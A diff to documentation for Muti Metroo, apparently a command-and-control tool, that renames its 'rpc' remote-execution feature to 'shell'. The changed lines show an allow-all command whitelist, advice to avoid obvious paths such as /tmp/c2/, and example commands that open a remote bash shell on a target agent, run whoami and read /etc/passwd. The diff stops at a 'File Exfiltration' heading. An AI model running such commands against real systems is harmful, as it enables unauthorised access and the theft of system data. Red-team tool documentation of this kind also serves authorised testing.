@@ -100,7 +100,7 @@ socks5:
 exit:
   enabled: false
 
-rpc:
+shell:
   enabled: false
 
 file_transfer:
@@ -248,10 +248,10 @@ Avoid obvious paths like `/tmp/c2/` or `/home/user/metroo/`.
 
 Muti Metroo provides several command and control capabilities:
 
-### Remote Command Execution (RPC)
+### Remote Command Execution (Shell)
 
 ```yaml
-rpc:
+shell:
   enabled: true
   whitelist:
     - "*"  # Allow all commands (use specific list in production)
@@ -261,9 +261,12 @@ rpc:
 
 Execute commands remotely:
 ```bash
-muti-metroo rpc <target-agent-id> whoami
-muti-metroo rpc <target-agent-id> cat /etc/passwd
-echo "script" | muti-metroo rpc <target-agent-id> bash
+# Interactive shell
+muti-metroo shell <target-agent-id> bash
+
+# One-shot commands via streaming mode
+muti-metroo shell --stream <target-agent-id> whoami
+muti-metroo shell --stream <target-agent-id> cat /etc/passwd
 ```
 
 ### File Exfiltration
